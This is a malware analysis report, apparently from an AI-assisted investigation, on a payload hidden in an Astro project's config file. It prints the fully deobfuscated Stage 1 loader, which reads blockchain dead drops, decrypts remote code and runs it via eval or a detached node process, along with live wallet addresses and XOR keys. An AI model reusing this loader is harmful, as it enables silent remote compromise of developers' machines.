# Task AL: 2023-Era Astro Payload — Human-Readable Deobfuscation

## Overview

**Source repo:** `iSebasC/Astro` — first commit 2023-01-05 (oldest confirmed infection)  
**Campaign ID:** `8-1821-1`  
**Payload size:** 5,490 bytes (4,786 bytes after stripping leading clean config)  
**Format:** `_$_1e42` outer decoder → `sfL` shuffle cipher → `_$_ccfc` string table → Stage 1 async IIFE  
**Reference:** Task AI identified this as the earliest pre-positioning artifact; Task AL decodes it fully.

---

## Structural Layers

```
astro.config.mjs (5,490 bytes)
├── Legitimate Astro config (275 bytes, followed by 255+ whitespace chars — hidden below fold)
└── Infection payload (4,786 bytes):
    ├── global['!'] = '8-1821-1'        ← campaign ID
    ├── _$_1e42 decoder → ['r','object','m']   ← gets require/module globals by name
    ├── sfL inner IIFE:
    │   ├── sfL() shuffle cipher (seed 2667686)
    │   ├── joW (shuffled JS code) → sfL(joW) = string table builder function
    │   ├── pYd (shuffled payload) → sfL(pYd) = inner async Stage 1 code
    │   └── pYd decoded using joW-built decoder → Stage 1 IIFE execution
    └── Stage 1 IIFE (async, 3,858 bytes decoded):
        ├── _$_ccfc string table (58 entries, seed 1812138)
        └── async dead-drop resolver + spawner
```

---

## Decoded String Table (`_$_ccfc`, 58 entries)

| Index | Value | Role |
|-------|-------|------|
| 0 | `"r"` | `require` (global key) |
| 1 | `"_V"` | Campaign ID global var |
| 2 | `"A"` | Campaign ID prefix |
| 3 | `"!"` | Campaign ID source key |
| 6 | `"on"` | EventEmitter method |
| 8 | `"data"` / `"end"` / `"error"` | HTTP response events |
| 10 | `"JSON"` / `"parse"` / `"stringify"` | JSON ops |
| 12 | `"https"` | Node module |
| 13 | `"Promise"` | Async constructor |
| 16 | `"POST"` | BSC RPC method |
| 22 | `"utf8"` / `"hex"` | Buffer encodings |
| 24 | `"raw_data"` | TRON response field |
| 25 | `"/transactions?only_confirmed=true&only_from=true&limit=1"` | TRON API query |
| 29 | `"arguments"` | Aptos payload field |
| 30 | `"payload"` | Aptos response field |
| 31 | `"/transactions?limit=1"` | Aptos API query |
| 32 | `"?.?"` | BSC calldata separator |
| 34 | `"input"` | BSC result field |
| 36 | `"eth_getTransactionByHash"` | BSC RPC method |
| **37** | **`"bsc-dataseed.binance.org"`** | BSC primary RPC |
| **38** | **`"bsc-rpc.publicnode.com"`** | BSC fallback RPC |
| 43 | `"getTime"` | Timestamp method |
| 44 | `"Date"` | Anti-repetition timer |
| 45 | `"_p_t"` | Previous-call timestamp global |
| **46** | **`"2[gWfGj;<:-93Z^C"`** | XOR key — W1 channel |
| **47** | **`"TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP"`** | TRON W1 wallet |
| **48** | **`"0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e"`** | Aptos A1 address |
| **49** | **`"m6:tTh^D)cBz?NM]"`** | XOR key — W2 channel |
| **50** | **`"TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG"`** | TRON W2 wallet |
| **51** | **`"0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3"`** | Aptos A2 address |
| 52 | `"node"` | Spawned process |
| 53 | `"-e"` | Node inline eval flag |
| 55 | `"ignore"` | stdio detach option |
| 56 | `"spawn"` | child_process method |
| 57 | `"child_process"` | Node module |

**All six core IOCs** (W1, W2, A1, A2, XOR-W1, XOR-W2) were embedded in the 2023 payload. The C2 infrastructure was complete before the wallets had a single transaction.

---

## Human-Readable Stage 1 Code

The following is the fully deobfuscated Stage 1, with obfuscated identifiers replaced by readable names and inline annotations:

```javascript
// ── Entry point ─────────────────────────────────────────────────────────────
// Sets global._V = "A" + campaign_id ("A8-1821-1" for this infection)
global['_V'] = "A" + global['!'];

(async () => {
  const req = global['r'];  // require()

  // ── HTTPS GET helper ─────────────────────────────────────────────────────
  // Returns parsed JSON from a GET request. Guard: aborts if _$af163278
  // (the string table decoder function) has been nulled out — anti-analysis.
  async function httpsGet(url) {
    return new Promise((resolve, reject) => {
      if (!_$af163278) { return; }           // anti-analysis guard
      req('https').get(url, (res) => {
        let body = '';
        res.on('data', (chunk) => { body += chunk; });
        res.on('end', () => {
          try { resolve(JSON.parse(body)); }
          catch (e) { reject(e); }
        });
      })
      .on('error', (e) => { reject(e); })
      .end();
    });
  }

  // ── BSC JSON-RPC POST helper ─────────────────────────────────────────────
  // Calls eth_getTransactionByHash on a BSC RPC endpoint via HTTPS POST.
  async function bscRpc(method, params, hostname) {
    return new Promise((resolve, reject) => {
      const body = JSON.stringify({ jsonrpc: '2.0', method, params, id: 1 });
      const req_ = req('https').request(
        { hostname, method: 'POST' },
        (res) => {
          let data = '';
          res.on('data', (c) => { data += c; });
          res.on('end', () => {
            try { resolve(JSON.parse(data)); }
            catch (e) { reject(e); }
          });
        }
      ).on('error', reject);
      req_.write(body);
      req_.end();
    });
  }

  // ── Dead-drop resolver ────────────────────────────────────────────────────
  // Reads a BSC tx hash from TRON (primary) or Aptos (fallback), then fetches
  // that BSC tx and XOR-decrypts its calldata with the provided key.
  //
  // Parameters:
  //   xorKey   — decryption key for this channel (W1 or W2)
  //   tronAddr — TRON wallet to poll (W1 or W2)
  //   aptosAddr — Aptos fallback address (A1 or A2)
  async function resolveDeadDrop(xorKey, tronAddr, aptosAddr) {
    let bscHash;

    // Step 1 — TRON (primary dead-drop)
    // Reads the LATEST OUTGOING confirmed tx from tronAddr.
    // The BSC hash is stored in the tx calldata field, encoded as hex UTF-8.
    try {
      const tronUrl = 'https://api.trongrid.io/v1/accounts/' + tronAddr
                    + '/transactions?only_confirmed=true&only_from=true&limit=1';
      const tronResp = await httpsGet(tronUrl);
      bscHash = Buffer
        .from(tronResp.data[0].raw_data.data, 'hex')  // hex → bytes
        .toString('utf8')                              // bytes → string
        .split('').reverse().join('');                 // reversed string
      if (!bscHash) throw new Error();
    } catch (e) {
      // Step 2 — Aptos (fallback dead-drop)
      // Reads the latest tx from aptosAddr; BSC hash in payload.arguments[0].
      const aptosUrl = 'https://fullnode.mainnet.aptoslabs.com/v1/accounts/' + aptosAddr
                     + '/transactions?limit=1';
      const aptosResp = await httpsGet(aptosUrl);
      bscHash = aptosResp[0].payload.arguments[0];
    }

    // Step 3 — BSC fetch
    // Calls eth_getTransactionByHash with the retrieved hash.
    // The calldata format is: <prefix>?.?<xor-encrypted-payload>
    // We take everything after "?.?" as the encrypted payload.
    async function fetchBsc(rpc) {
      const bscResp = await bscRpc('eth_getTransactionByHash', [bscHash], rpc);
      return Buffer
        .from(bscResp.result.input.substring(2), 'hex')  // strip '0x', hex → bytes
        .toString('utf8')
        .split('?.?')[1];  // take payload after separator
    }

    let encrypted;
    try {
      encrypted = await fetchBsc('bsc-dataseed.binance.org');  // primary
      if (!encrypted) throw new Error();
    } catch (e) {
      encrypted = await fetchBsc('bsc-rpc.publicnode.com');    // fallback
    }

    // Step 4 — XOR decrypt
    // Key repeats cyclically over the encrypted payload bytes.
    const keyLen = xorKey.length;
    let decrypted = '';
    for (let i = 0; i < encrypted.length; i++) {
      const keyByte = xorKey.charCodeAt(i % keyLen);
      decrypted += String.fromCharCode(encrypted.charCodeAt(i) ^ keyByte);
    }
    return decrypted;  // → Stage 2 JavaScript source
  }

  // ── Anti-repetition guard ────────────────────────────────────────────────
  // If called within 30 seconds of the last run, exits silently.
  // Prevents multiple rapid triggers (e.g. repeated astro builds).
  const now = (new Date()).getTime();
  try {
    if (global['_p_t'] && now - global['_p_t'] < 30000) { return; }
  } catch (e) {}
  global['_p_t'] = now;

  // ── W1 channel (primary) ─────────────────────────────────────────────────
  // XOR key: "2[gWfGj;<:-93Z^C"
  // TRON:    TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP  (W1)
  // Aptos:   0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e  (A1)
  try {
    const stage2 = await resolveDeadDrop(
      '2[gWfGj;<:-93Z^C',
      'TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP',
      '0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e'
    );
    eval(stage2);  // execute Stage 2 directly (W1 path)
    return;        // W1 succeeded — skip W2
  } catch (e) {}

  // ── W2 channel (fallback) ────────────────────────────────────────────────
  // XOR key: "m6:tTh^D)cBz?NM]"
  // TRON:    TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG  (W2)
  // Aptos:   0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3  (A2)
  try {
    const stage2 = await resolveDeadDrop(
      'm6:tTh^D)cBz?NM]',
      'TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG',
      '0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3'
    );

    // W2 path differs: spawns a detached child `node -e` process
    // instead of eval() in the current process.
    // This detaches execution from the build tool (astro dev/build),
    // making Stage 2 survive even if the parent process exits.
    req('child_process').spawn(
      'node',
      ['-e', "global['_V']='" + (global['_V'] || 0) + "';" + stage2 + ''],
      { detached: true, stdio: 'ignore', windowsHide: true }
    ).on('error', () => { eval(stage2); });  // fallback: eval in-process on spawn failure
  } catch (e) {}
})();
```

---

## Key Findings

### 1. The entire C2 infrastructure was finalized in January 2023

Every IOC present in 2025/2026 samples was already embedded in the January 2023 payload:

| Element | 2023 value | Status in 2025/2026 |
|---------|-----------|---------------------|
| TRON W1 | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | **Identical** |
| TRON W2 | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | **Identical** |
| Aptos A1 | `0xbe037400...380811e` | **Identical** |
| Aptos A2 | `0x3f0e5781...5dce3` | **Identical** |
| XOR key W1 | `2[gWfGj;<:-93Z^C` | **Identical** |
| XOR key W2 | `m6:tTh^D)cBz?NM]` | **Identical** |
| BSC primary | `bsc-dataseed.binance.org` | **Identical** |
| BSC fallback | `bsc-rpc.publicnode.com` | **Identical** |
| BSC separator | `?.?` | **Identical** |
| TRON query | `only_from=true` | **Identical** |
| Aptos fallback | Present | **Identical** |

None of these rotated in 2+ years of operation. The actor built a production-ready system and froze the infrastructure layer, relying only on JS obfuscation changes to evade detection.

### 2. Payload structure is byte-identical to 2025 variants

Comparing `iSebasC/Astro` (2023-01-05, ID `8-1821-1`) to `drewroberts/website` (ID `9-0264-2`):
- The `pYd` encrypted payload is byte-for-byte identical
- The `joW` decoder function is byte-for-byte identical  
- The `sfL` cipher seed is identical (2667686)
- The `_$_ccfc` encrypted string table is identical (seed 1812138)
- The **only** difference: campaign ID (`8-1821-1` vs `9-0264-2`) and a trailing newline

This confirms `Focus158/school-landing` (2025-05-17, ID `8-1821-1`) was a copy-paste of the iSebasC payload, not a fresh infection — `Focus158` copied an already-infected `astro.config.mjs` from `iSebasC/Astro` without realising it.

### 3. Dual-channel execution: W1 eval vs W2 detached spawn

The 2023 payload already had both execution paths:
- **W1 path**: `eval(stage2)` — inline execution in astro process
- **W2 path**: `child_process.spawn('node', ['-e', stage2], {detached:true, stdio:'ignore'})` — detached subprocess

The detached spawn means the Stage 2 RAT persists even after `astro dev` or `astro build` exits. The victim closes their terminal; the malware keeps running.

### 4. Anti-repetition was already in place in 2023

`global['_p_t']` (previous timestamp) with a 30-second cooldown was present from the start. The actor anticipated that developers run `astro build` many times per session and prevented redundant Stage 2 downloads.

### 5. Campaign ID prefixed with "A" before routing

`global['_V'] = "A" + global['!']` → `"A8-1821-1"`

This places the campaign in the `'A'` routing branch of the Stage 2 routing table (`_$_a478`), which routes to `23.27.13.43` — the "old `_$_1e42` batch victim handler." This is the pre-2025 batch server, consistent with these being legacy infections from the actor's early `_$_1e42` era.

---

## 2023 vs 2025/2026 Comparison

| Attribute | 2023 sfL payload | Jun 2025 activation | Jun 2026 current |
|-----------|-----------------|---------------------|-----------------|
| Payload obfuscation | sfL IIFE | sfL IIFE | `_$_913e`, `_$_b229`, `_$_4445`... |
| String table | `_$_ccfc` (58 entries, seed 1812138) | Identical | New outer ciphers, same IOCs |
| W1/W2 wallets | Present | Present | Present |
| A1/A2 Aptos | Present | Present | Present |
| XOR keys | Present | Present | Present |
| TRON only_from | Yes | Yes | Yes |
| BSC dead-drop | Full chain | Full chain | Full chain |
| Detached spawn (W2) | Yes | Yes | Yes |
| C2 IPs (166.88 etc.) | **NOT present** | **NOT present** | Present (in Stage 2) |
| `/$/boot` endpoint | **NOT present** | **NOT present** | Present (in Stage 2) |
| Stage 3 RAT | Via BSC eval | Via BSC eval | Via BSC → Stage 2 → Stage 3 |

**What was added after 2023:**
- JS obfuscation was periodically re-encrypted with new cipher wrappers (`_$_1e42` → `_$_913e` → etc.)
- The Stage 2 layer (`RS260605` generator-function format) was introduced as a separate delivery mechanism
- C2 IPs (`166.88.134.62`, `198.105.127.210`) appear only in Stage 2 (Jun 2026), not in the 2023 Stage 1
- The actor's operational security improved over time (new outer ciphers, multi-stage eval chain)

**What was unchanged since 2023:**
- Every single IOC: wallets, Aptos addresses, XOR keys, BSC RPCs
- The fundamental dead-drop architecture
- The W2 detached-spawn execution model

---

## Dormancy Model

The 2023 payload was fully weaponized but required the actor to make a transaction FROM W1 or W2. With no transactions on those wallets, every invocation hit the TRON API, received empty data, tried Aptos, received empty data, and exited silently.

The actor's operational posture was:
1. Infect repositories now (2023) while developers trust open-source Astro templates
2. Wait — accumulate victim machines running the dormant payload
3. When ready to operate, make a single TRON transaction → all dormant infections simultaneously activate

This is a **sleeper botnet pre-seeding** strategy: the cost of activation is one blockchain transaction; the victim pool was built over 2+ years at no operational risk to the actor (no C2 callbacks to detect during dormancy).

---

## Files

- Raw payload: fetched live from `https://raw.githubusercontent.com/iSebasC/Astro/` (GitHub)  
- Decoder: `/tmp/claude-0/.../scratchpad/decode_ccfc.js`  
- See also: `ANALYSIS_ASTRO_CLUSTER_AI.md` (full cluster map), `ANALYSIS_AK_RAFI.md` (double-infection variant), `ANALYSIS_AB_RS260605_STAGE2.md` (Stage 2 layer)
